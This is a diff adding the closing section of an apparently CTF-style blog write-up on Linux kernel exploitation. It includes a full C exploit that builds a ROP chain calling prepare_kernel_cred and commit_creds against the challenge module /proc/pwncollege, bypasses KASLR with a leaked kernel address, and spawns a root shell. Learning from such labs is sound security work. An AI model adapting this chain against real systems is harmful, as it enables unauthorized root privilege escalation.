@@ -7,7 +7,7 @@ math: true
 mermaid: true
 media_subpath: /assets/posts/2026-02-21-Kernel-Security
 image:
-  path: completed.png
+  path: poc.png
 ---
 
 ## Kernel Security
@@ -658,3 +658,128 @@ These value must be in the correct order:
 
 ![ret2usr](ret2usr.png)
 
+With this, we can safely return back to userspace after updating our credential to that of root
+
+One thing to note is that in order to have a valid `cs, rflags, rsp, ss` register, we can save the current state before commuicating with the kernel module.
+
+This is my final exploit code
+
+```c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include "log.h"
+
+#define leak 0xa9690b85ffffffff
+#define printk __builtin_bswap64(leak)
+#define kbase (printk - 0xb69a9)
+
+#define prepare_kernel_cred (kbase + 0x89660)
+#define commit_creds (kbase + 0x89310)
+
+#define iretq (kbase + 0x23d42)
+#define swapgs_restore_regs (kbase + 0xc00a45)
+
+#define pivot_gadget (kbase + 0x1ac939) // push rdi ; pop rsp ; ret
+#define pop_rdi (kbase + 0x1518) // pop rdi ; ret
+#define pop_rcx (kbase + 0x3c38b)  // pop rcx ; ret
+#define mov_rdi_rax (kbase + 0x1c0eb) // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
+
+uint64_t user_cs, user_ss, user_sp, user_rflags, user_rip;
+
+void spawn_shell()
+{
+
+    if (getuid() == 0) {
+        char *argv[] = {"/bin/sh", NULL};
+        char *envp[] = {NULL};
+        execve(argv[0], argv, envp);
+    } else {
+        logErr("Privilege escalation failed");
+        exit(1);
+    }
+
+}
+
+void save_state()
+{
+    __asm__(".intel_syntax noprefix;"
+            "mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop qword ptr [rip+user_rflags];"
+            ".att_syntax");
+
+    user_rip = (uint64_t )spawn_shell;
+    logInfo("Saved user state - RIP: 0x%lx, CS: 0x%lx, RFLAGS: 0x%lx, RSP: 0x%lx, SS: 0x%lx",
+            user_rip, user_cs, user_rflags, user_sp, user_ss);
+}
+
+int main() {
+
+    save_state();
+
+    int fd = open("/proc/pwncollege", O_RDWR);
+    
+    if (fd <= 0) {
+        logErr("Failed to open /proc/pwncollege");
+        exit(1);
+    }
+
+    unsigned char buffer[0x108];
+    
+    uint64_t *chain = (uint64_t *)&buffer;
+    *chain++ = pop_rdi;
+    *chain++ = 0x0;
+    *chain++ = prepare_kernel_cred;
+    *chain++ = pop_rcx;
+    *chain++ = 0x0;
+    *chain++ = mov_rdi_rax;
+    *chain++ = commit_creds;
+    *chain++ = swapgs_restore_regs;
+    *chain++ = 0x0;
+    *chain++ = 0x0;
+    *chain++ = user_rip;
+    *chain++ = user_cs;
+    *chain++ = user_rflags;
+    *chain++ = user_sp;
+    *chain++ = user_ss;
+
+    *(uint64_t *)(buffer + 0x100) = pivot_gadget;
+
+    logInfo("Sending payload");
+    write(fd, buffer, sizeof(buffer));
+    return 0;
+}
+```
+
+Here's how it works, first I extract the leak from the ring buffer.
+
+![connect](connect.png)
+![connect2](connect2.png)
+
+The leaked address obtained from the kernel log was:
+
+```
+0xa9690bb6ffffffff
+```
+
+But of course in little endian format.
+
+It's necessary to manually update the address in the exploit.
+
+![exp](exp.png)
+
+After compiling, transferring, and executing the exploit, we successfully achieve Local Privilege Escalation (LPE) and obtain root privileges.
+
+![poc](poc.png)
+
+With control over execution flow, a reliable kernel leak, and KASLR bypassed, the exploit completes the chain and elevates our privileges from an unprivileged user to root.
+
+I hope you enjoyed this writeup - merci!
